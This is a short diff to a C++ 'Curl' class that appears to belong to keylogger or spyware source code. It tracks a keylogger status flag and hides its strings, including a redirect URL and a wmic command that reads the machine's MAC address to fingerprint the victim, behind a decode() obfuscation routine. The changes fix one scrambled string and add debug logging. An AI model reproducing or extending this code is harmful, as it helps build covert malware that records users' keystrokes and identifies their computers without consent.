@@ -14,7 +14,7 @@ Curl::Curl()
 {
 	this->Keylogger_status = FALSE;
 
-	this->redirect_website = decode(";1/1/0.0.7.12//p:ttlhtm.hgePactredire;"); // decode -> http://127.0.0.1/1/redirectPage.html
+	this->redirect_website = decode("1/1/0.0.7.12//p:ttlhtm.hgePactredire"); // decode -> http://127.0.0.1/1/redirectPage.html
 	this->mac_address = Tools::CMD(decode("et gueTrr=teapAdalicysPhe erwhc nic mi2wt rsFi - 1ipSk -ctlese| s esdrAdAC M"), TRUE, TRUE); // decode -> wmic nic where PhysicalAdapter=True get MACAddress | select -Skip 1 -First 2
 	if (this->mac_address.find(':') != std::string::npos)
 		this->mac_address.erase(std::remove(this->mac_address.begin(), this->mac_address.end(), ':'), this->mac_address.end());
@@ -27,6 +27,11 @@ Curl::Curl()
 
 void Curl::Initialize()
 {
+	#ifndef LOG_OFF
+		std::cout << "Curl::Initialize: Initializing CURL\n";
+		OutputDebugStringA("Curl::Initialize: Initializing CURL\n");
+	#endif // !LOG_OFF
+
 	std::string check_status = "";
 	int check_count = 0;
 	
